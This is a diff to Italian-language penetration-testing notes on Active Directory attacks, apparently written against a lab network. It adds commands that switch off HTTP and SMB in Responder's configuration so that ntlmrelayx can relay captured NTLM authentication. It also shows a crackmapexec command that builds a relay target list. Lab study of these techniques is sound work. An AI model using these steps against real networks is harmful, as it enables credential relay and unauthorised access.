@@ -60,7 +60,12 @@ crackmapexec smb 192.168.56.10-23 --gen-relay-list relay.txt
 ![[Pasted image 20230825154818.png]]
 *responder + ntlmrelayx to smb*
 Inanzitutto bisogna disabilitare smb e http su responder per poter fare il relay
-
+```bash
+sudo sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf && cat /etc/responder/Responder.conf | grep --color=never 'HTTP ='
+```
+```bash
+sudo sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf && cat /etc/responder/Responder.conf | grep --color=never 'SMB ='
+```
 ### **USER ENUM(W\ CREDS)**
 Per ottenere tutti gli User di un dominio avendo un account a disposizione
 ```bash
